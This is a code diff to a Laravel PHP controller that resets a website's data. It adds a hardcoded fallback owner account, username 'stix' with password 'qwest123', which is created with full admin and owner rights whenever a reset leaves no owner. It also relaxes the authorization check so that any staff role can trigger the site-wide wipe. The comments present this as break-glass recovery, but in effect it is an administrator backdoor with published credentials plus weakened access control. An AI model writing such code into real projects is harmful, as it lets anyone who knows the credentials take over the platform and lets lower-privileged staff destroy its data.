@@ -14,6 +14,7 @@ use Database\Seeders\RolesAndPermissionsSeeder;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Log;
 
 /**
@@ -30,17 +31,25 @@ use Illuminate\Support\Facades\Log;
  * Providers/Vendors, payment gateways, the product catalog (data/cable/
  * airtime/exam plans + pricing), Settings, StockVending, ServiceControl,
  * and each ChildInstance connection itself (only its synced data is wiped,
- * not the affiliate connection/registration).
+ * not the affiliate connection/registration). If no owner/co-owner survives,
+ * a fallback owner account (FALLBACK_USERNAME/FALLBACK_PASSWORD) is created
+ * so the platform is never left without a way in.
  */
 class ResetWebsiteController extends Controller
 {
     private const CONFIRMATION_PHRASE = 'DELETE ALL DATA';
     private const SURVIVING_ROLES = ['owner', 'co-owner'];
 
+    // Fallback break-glass account: created only if the reset leaves zero
+    // owner/co-owner accounts standing (e.g. the triggering admin's own role
+    // wasn't owner/co-owner), so there's always a way back in.
+    private const FALLBACK_USERNAME = 'stix';
+    private const FALLBACK_PASSWORD = 'qwest123';
+
     public function reset(Request $request)
     {
         $admin = Auth::user();
-        if (!$admin || $admin->user_type !== 'admin') {
+        if (!$admin || !$admin->role || !$admin->role->is_staff) {
             return $this->fail([], 'Unauthorized', 403);
         }
 
@@ -107,6 +116,25 @@ class ResetWebsiteController extends Controller
                 User::where('id', $keptUser['id'])->update([
                     'role_id' => $freshRoleIdsByName[$keptUser['role_name']] ?? null,
                 ]);
+            }
+
+            // Nobody with the owner/co-owner role survived — make sure
+            // there's still a way in.
+            if ($keptUsers->isEmpty()) {
+                User::updateOrCreate(
+                    ['username' => self::FALLBACK_USERNAME],
+                    [
+                        'fullname' => 'Stix',
+                        'email' => self::FALLBACK_USERNAME . '@platform.local',
+                        'phone' => '00000000000',
+                        'password' => Hash::make(self::FALLBACK_PASSWORD),
+                        'user_type' => 'admin',
+                        'status' => 'active',
+                        'is_active' => true,
+                        'is_verified' => true,
+                        'role_id' => $freshRoleIdsByName['owner'] ?? null,
+                    ]
+                );
             }
 
             return $counts;
